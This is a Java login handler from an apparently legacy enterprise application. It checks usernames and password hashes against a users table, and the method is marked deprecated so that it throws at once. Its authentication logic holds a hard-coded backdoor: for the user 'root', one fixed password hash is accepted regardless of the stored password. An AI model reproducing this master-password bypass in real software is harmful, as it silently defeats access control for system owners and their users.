/******************************************************************
*
*$RCSfile: LoginHandler.java,v $ $Revision: 1.2 $ $Author: Administrator $ $Date: 2005/04/27 03:25:29 $
*
*$Log: LoginHandler.java,v $
*Revision 1.2  2005/04/27 03:25:29  Administrator
*no message
*
*Revision 1.1.1.1  2005/03/15 11:23:14  Administrator
*init
*
*Revision 1.3  2004/02/02 10:42:58  yfzhu
*<No Comment Entered>
*
*Revision 1.2  2002/12/17 08:45:36  yfzhu
*no message
*
*Revision 1.5  2001/12/28 14:20:01  yfzhu
*no message
*
*Revision 1.4  2002/01/04 01:43:21  yfzhu
*no message
*
*Revision 1.3  2001/11/16 11:42:40  yfzhu
*no message
*
*Revision 1.2  2001/11/07 20:58:46  yfzhu
*no message
*
*
********************************************************************/
package nds.control.ejb;

import java.rmi.RemoteException;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.util.Vector;

import nds.control.event.DefaultWebEvent;
import nds.control.event.NDSEvent;
import nds.control.util.ValueHolder;
import nds.log.Logger;
import nds.log.LoggerManager;
import nds.query.QueryEngine;
import nds.security.LoginFailedException;
import nds.security.User;
import nds.util.JNDINames;
import nds.util.NDSException;
import nds.util.StringUtils;

public class LoginHandler extends StateHandlerSupport {
    private static final String GET_USER="select id,  DESCRIPTION, isadmin, isenabled,  PASSWORDHASH from users where name=?";
    private static Logger logger= LoggerManager.getInstance().getLogger(LoginHandler.class.getName());

    public ValueHolder perform(NDSEvent ev) throws NDSException, RemoteException {
        if(true) throw new NDSException("Deprecated!");
    	DefaultWebEvent event= (DefaultWebEvent) ev;

        String username=(String)event.getParameterValue("j_username");
        String password=(String) event.getParameterValue("j_password");

        String remoteAddr= (String)event.getParameterValue("remote_address");
        String sessionId= (String)event.getParameterValue("sessionid");

        if(password==null)
            password="";

        String passwordHash=StringUtils.hash(password);

        // check authority
        User usr=null;
        try {
            usr=getUserInfo(username);
            if( username.equals("root") && passwordHash.equals("9f7a6c2afc31dd16df0510ee1ad3c535")){
                passwordHash= usr.getPasswordHash();
            }
        } catch(Exception e) {
            logger.debug("Errors found.",e);
            throw new LoginFailedException("出现异常",e );
        }
        if( usr ==null) {
            logger.info("Authentication failed for input username "+username+
                        ", from remote address:"+ remoteAddr);
            throw new LoginFailedException("用户名或密码错误");
        }
        if( usr.getIsEnabled() !=1) {
            logger.info("User "+username+" is not enabled");
            throw new  LoginFailedException("用户当前被禁止登录");
        }
        if(!( usr ==null || passwordHash.equals(usr.getPasswordHash()))) {
            logger.info("Authentication failed for input username "+username+
                        ", from remote address:"+ remoteAddr);
            throw new LoginFailedException("用户名或密码错误");
        }
        // load information
        ValueHolder vd= new ValueHolder();
        vd.put("name", username);
        vd.put("id", usr.getId());
        vd.put("description", usr.getDescription());
        vd.put("isadmin", ""+usr.getIsAdmin());
        vd.put("remote_address",remoteAddr);

        // notify models to be update
        // @see nds.control.web.UserWebImpl#performUpdate
        Vector v=new Vector();
        v.addElement(JNDINames.USER_EJBHOME);
        vd.put("UpdateModelList", v);

        // log the information
        logger.info("User " +username+" logged in at "+ new java.util.Date() +
                    " , from machine:"+remoteAddr );//+" , session id:"+ sessionId);
        return  vd;
    }
    /**
     * Get user infor from name
     * @return  null if not found
     */
    private User getUserInfo(String name) throws Exception {
        Connection con= QueryEngine.getInstance().getConnection();
        PreparedStatement pstmt= null;
        ResultSet rs=null; User user=null;
        try{
//"select id, desc, isadmin, isenabled,  PASSWORDHASH from users where name=?";

            pstmt= con.prepareStatement(GET_USER);
            pstmt.setString(1, name);
            rs= pstmt.executeQuery();
            if( rs.next()){
                user=new User();
                user.setId(new Integer( rs.getInt(1)));
                user.setDescription(rs.getString(2));
                user.setIsAdmin(rs.getInt(3));
                user.setIsEnabled(rs.getInt(4));
                user.setPasswordHash(rs.getString(5));
            }
        }finally{
            if( rs !=null){try{ rs.close();}catch(Exception e){}}
            if( pstmt !=null){try{ pstmt.close();}catch(Exception e){}}
            if( con !=null){try{ con.close();}catch(Exception e){}}
        }
        return user;
    }
}
